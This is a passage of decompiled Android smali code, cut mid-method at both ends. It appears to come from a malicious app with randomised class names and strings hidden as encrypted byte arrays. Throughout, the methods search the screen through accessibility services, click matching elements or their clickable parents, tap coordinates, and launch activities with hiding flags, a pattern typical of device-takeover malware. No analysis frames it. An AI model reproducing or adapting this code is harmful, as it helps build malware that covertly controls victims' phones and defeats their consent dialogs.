    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->a:Ljava/lang/String;

    invoke-direct {v2, v3}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;

    sget-object v3, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->d:Ljava/lang/String;

    invoke-direct {v2, v3}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;-><init>(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->c(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$a;)V

    const/4 v2, 0x7

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v0, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v2, v3}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->q(Ljava/lang/String;[Ljava/lang/String;)V

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->D_iao:Ljava/lang/String;

    new-array v3, v1, [B

    const/16 v4, 0x20

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v0, [B

    fill-array-data v4, :array_4

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v8, ""

    const-string v9, ""

    const-string v10, ""

    new-array p1, v1, [B

    const/16 v1, 0x6b

    aput-byte v1, p1, v5

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v11

    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    new-instance v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/d00;

    move-object v6, v0

    move-object v7, p0

    invoke-direct/range {v6 .. v11}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/d00;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/Executor;->execute(Ljava/lang/Runnable;)V

    goto :goto_0

    :cond_0
    sget-object v2, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Hide_Type:Ljava/lang/String;

    new-array v1, v1, [B

    const/16 v3, -0x6e

    aput-byte v3, v1, v5

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    invoke-static {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance p1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lcom/vknnolqo/p9sv5zvf/A5oWPwNw;

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    :cond_1
    invoke-virtual {p0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void

    nop

    :array_0
    .array-data 1
        0x14t
        0x40t
        -0x62t
        0x40t
        0x50t
        -0x34t
        0x13t
        0x30t
    .end array-data

    :array_1
    .array-data 1
        0x7bt
        0x2et
        -0x3t
        0x1ft
        0x32t
        -0x48t
        0x61t
        0x49t
    .end array-data

    :array_2
    .array-data 1
        0x22t
        -0x4t
        0x65t
        0x46t
        0x53t
        -0x3dt
        0x76t
    .end array-data

    :array_3
    .array-data 1
        0x4ct
        -0x6dt
        0x7t
        0x2at
        0x32t
        -0x60t
        0x1dt
        -0x2at
    .end array-data

    :array_4
    .array-data 1
        0x11t
        0x27t
        -0x3dt
        -0x5ft
        -0xbt
        0x54t
        0x32t
        0x62t
    .end array-data

    :array_5
    .array-data 1
        0x5bt
        -0x49t
        0x2dt
        -0x3ct
        0x79t
        0x6ft
        0x23t
        -0x6t
    .end array-data

    :array_6
    .array-data 1
        -0x7t
        0x44t
        0x1at
        -0x1dt
        -0x28t
        0x77t
        0x5ft
        0x48t
    .end array-data
.end method

.method public static synthetic y()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->G2()V

    return-void
.end method

.method private static y0()V
    .locals 6

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/iz;

    invoke-direct {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/iz;-><init>()V

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->L0(Landroid/view/accessibility/AccessibilityNodeInfo;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ui;)V

    goto/16 :goto_1

    :cond_0
    const/16 v0, 0x24

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v1, v2, [B

    fill-array-data v1, :array_3

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const-wide/16 v3, 0x9c4

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v5

    if-nez v5, :cond_1

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->d1(Ljava/util/List;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_2

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->R2(Ljava/util/List;)V

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tz;

    invoke-direct {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/tz;-><init>()V

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/e00;

    invoke-direct {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/e00;-><init>(Landroid/os/Handler;)V

    goto :goto_0

    :cond_1
    const/16 v0, 0x26

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_2

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/g00;

    invoke-direct {v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/g00;-><init>()V

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->M0(ILjava/util/List;Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v9;)V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h00;

    invoke-direct {v1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/h00;-><init>(Landroid/os/Handler;)V

    :goto_0
    invoke-virtual {v0, v1, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    goto :goto_1

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a3()V

    :goto_1
    return-void

    nop

    :array_0
    .array-data 1
        0x32t
        -0x4dt
        -0x29t
        -0x58t
        0x13t
        0x45t
        0x7at
        0x75t
        0x7ft
        -0x54t
        -0x21t
        -0xct
        0x8t
        0x45t
        0x7ft
        0x69t
        0x38t
        -0x4dt
        -0x2ct
        -0x15t
        0x4t
        0x42t
        0x6dt
        0x7dt
        0x34t
        -0x52t
        -0x80t
        -0x11t
        0x1t
        0x3t
        0x61t
        0x75t
        0x27t
        -0x47t
        -0x1bt
        -0x1ct
        0x11t
        0x42t
        0x3dt
    .end array-data

    :array_1
    .array-data 1
        0x51t
        -0x24t
        -0x46t
        -0x7at
        0x65t
        0x2ct
        0xct
        0x1at
    .end array-data

    :array_2
    .array-data 1
        0x3t
        0x7dt
        0x2et
        0x6ft
        -0x25t
        0xbt
        -0x58t
        -0x43t
        0x4et
        0x62t
        0x26t
        0x33t
        -0x40t
        0xbt
        -0x53t
        -0x5ft
        0x9t
        0x7dt
        0x2dt
        0x2ct
        -0x34t
        0xct
        -0x41t
        -0x4bt
        0x5t
        0x60t
        0x79t
        0x28t
        -0x37t
        0x4dt
        -0x57t
        -0x45t
        0x4t
        0x75t
        0x26t
        0x35t
    .end array-data

    :array_3
    .array-data 1
        0x60t
        0x12t
        0x43t
        0x41t
        -0x53t
        0x62t
        -0x22t
        -0x2et
    .end array-data

    :array_4
    .array-data 1
        0x32t
        -0x31t
        -0x62t
        -0x16t
        -0x4at
        0x2bt
        0x13t
        0x22t
        0x7ft
        -0x30t
        -0x6at
        -0x4at
        -0x53t
        0x2bt
        0x16t
        0x3et
        0x38t
        -0x31t
        -0x63t
        -0x57t
        -0x5ft
        0x2ct
        0x4t
        0x2at
        0x34t
        -0x2et
        -0x37t
        -0x53t
        -0x5ct
        0x6dt
        0x8t
        0x22t
        0x27t
        -0x3bt
        -0x54t
        -0x5at
        -0x4ct
        0x2ct
    .end array-data

    nop

    :array_5
    .array-data 1
        0x51t
        -0x60t
        -0xdt
        -0x3ct
        -0x40t
        0x42t
        0x65t
        0x4dt
    .end array-data
.end method

.method private static y1()V
    .locals 7

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/16 v1, 0x34

    const/16 v3, 0x2e

    const/16 v4, 0x1f4

    const/4 v5, 0x1

    if-eqz v0, :cond_1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v6, v2, [B

    fill-array-data v6, :array_3

    invoke-static {v3, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sget-boolean v3, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v:Z

    if-eqz v3, :cond_0

    if-nez v0, :cond_0

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v2, v2, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    sput-boolean v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->d:Z

    :cond_0
    if-eqz v0, :cond_4

    sget-boolean v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->d:Z

    if-eqz v1, :cond_2

    new-instance v1, Landroid/graphics/Rect;

    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    move-result v0

    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    move-result v1

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    goto :goto_1

    :cond_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v6, v2, [B

    fill-array-data v6, :array_7

    invoke-static {v1, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v1

    if-eqz v1, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    :cond_2
    :goto_0
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :goto_1
    invoke-static {v4}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->P0()V

    goto :goto_2

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-array v1, v3, [B

    fill-array-data v1, :array_8

    new-array v2, v2, [B

    fill-array-data v2, :array_9

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_4

    goto :goto_0

    :cond_4
    sput-boolean v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->c:Z

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->i1()V

    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        0x43t
        -0x77t
        -0x50t
        0x5bt
        0x5bt
    .end array-data

    nop

    :array_1
    .array-data 1
        0x2bt
        -0x1at
        -0x22t
        0x34t
        0x29t
        0x5dt
        0x64t
        -0xdt
    .end array-data

    :array_2
    .array-data 1
        -0x21t
        0x33t
        -0x11t
        0x11t
        0xct
        -0x70t
        0x3ct
        0x4dt
        -0x2et
        0x33t
        -0x10t
        0x11t
        0x17t
        -0x80t
        0x27t
        0x56t
        -0x27t
        0x31t
        -0x11t
        0x5et
        0xat
        -0x68t
        0x33t
        0x47t
        -0x32t
        0x66t
        -0x15t
        0x5bt
        0x4bt
        -0x6ct
        0x3bt
        0x50t
        -0x27t
        0xct
        -0x13t
        0x48t
        0x1t
        -0x75t
        0x7t
        0x47t
        -0x38t
        0x28t
        -0x15t
        0x51t
        0x3t
        -0x76t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x44t
        0x5ct
        -0x7et
        0x3ft
        0x64t
        -0x7t
        0x54t
        0x22t
    .end array-data

    :array_4
    .array-data 1
        0xat
        -0x6ft
        -0x7bt
        0xbt
        -0x10t
        0xet
        0x73t
        -0x1ct
        0xct
        -0x69t
        -0x3at
        0x56t
        -0x1ft
        0x8t
        0x66t
        -0xat
        0x4t
        -0x6dt
        -0x77t
        0x4bt
        -0x7t
        0x1ct
        0x77t
        -0x1ft
        0x53t
        -0x69t
        -0x74t
        0xat
        -0xct
        0x12t
        0x61t
        -0x19t
        0x36t
        -0x61t
        -0x66t
        0x57t
        -0x9t
        0xct
        0x4dt
        -0x2t
        0x6t
        -0x74t
        -0x73t
        0x7at
        -0x15t
        0x1et
        0x66t
        -0x19t
        0x0t
        -0x70t
        -0x71t
        0x56t
    .end array-data

    :array_5
    .array-data 1
        0x69t
        -0x2t
        -0x18t
        0x25t
        -0x68t
        0x7bt
        0x12t
        -0x6dt
    .end array-data

    :array_6
    .array-data 1
        -0x48t
        0x1ct
        0x55t
        0x59t
        0x49t
        -0x4ct
        -0x11t
        0x5at
        -0x42t
        0x1at
        0x16t
        0x4t
        0x58t
        -0x4et
        -0x6t
        0x48t
        -0x4at
        0x1et
        0x59t
        0x19t
        0x40t
        -0x5at
        -0x15t
        0x5ft
        -0x1ft
        0x1at
        0x5ct
        0x58t
        0x4dt
        -0x58t
        -0x3t
        0x59t
        -0x7ct
        0x12t
        0x4at
        0x5t
        0x4et
        -0x4at
        -0x2ft
        0x40t
        -0x4ct
        0x1t
        0x5dt
        0x28t
        0x52t
        -0x5ct
        -0x6t
        0x59t
        -0x4et
        0x1dt
        0x5ft
        0x4t
    .end array-data

    :array_7
    .array-data 1
        -0x25t
        0x73t
        0x38t
        0x77t
        0x21t
        -0x3ft
        -0x72t
        0x2dt
    .end array-data

    :array_8
    .array-data 1
        -0x19t
        0x4dt
        0x18t
        0x59t
        0x5et
        -0x62t
        -0x54t
        -0x4ft
        -0x1ft
        0x4bt
        0x5bt
        0x4t
        0x4ft
        -0x68t
        -0x47t
        -0x5dt
        -0x17t
        0x4ft
        0x14t
        0x19t
        0x57t
        -0x74t
        -0x58t
        -0x4ct
        -0x42t
        0x4bt
        0x11t
        0x58t
        0x5bt
        -0x7ct
        -0x41t
        -0x5dt
        -0x25t
        0x52t
        0x1at
        0x0t
        0x53t
        -0x67t
        -0x6et
        -0x4bt
        -0x1ft
        0x56t
        0x1t
        0x1et
        0x58t
        -0x74t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x7ct
        0x22t
        0x75t
        0x77t
        0x36t
        -0x15t
        -0x33t
        -0x3at
    .end array-data
.end method

.method private static synthetic y2(Landroid/content/Context;)V
    .locals 5

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->Q2()V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xz;

    invoke-direct {v2, p0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/xz;-><init>(Landroid/content/Context;Landroid/content/Intent;)V

    const-wide/16 v3, 0xbb8

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method public static synthetic z()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->e2()V

    return-void
.end method

.method private static z0()V
    .locals 9

    .line 1
    const/16 v0, 0x23

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/16 v2, 0x12

    const/16 v3, 0x64

    const/4 v4, 0x0

    const/4 v5, 0x1

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v6

    const/4 v7, 0x3

    if-ne v6, v7, :cond_1

    sget-boolean v6, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->u:Z

    if-eqz v6, :cond_0

    sput-boolean v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->k:Z

    :cond_0
    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

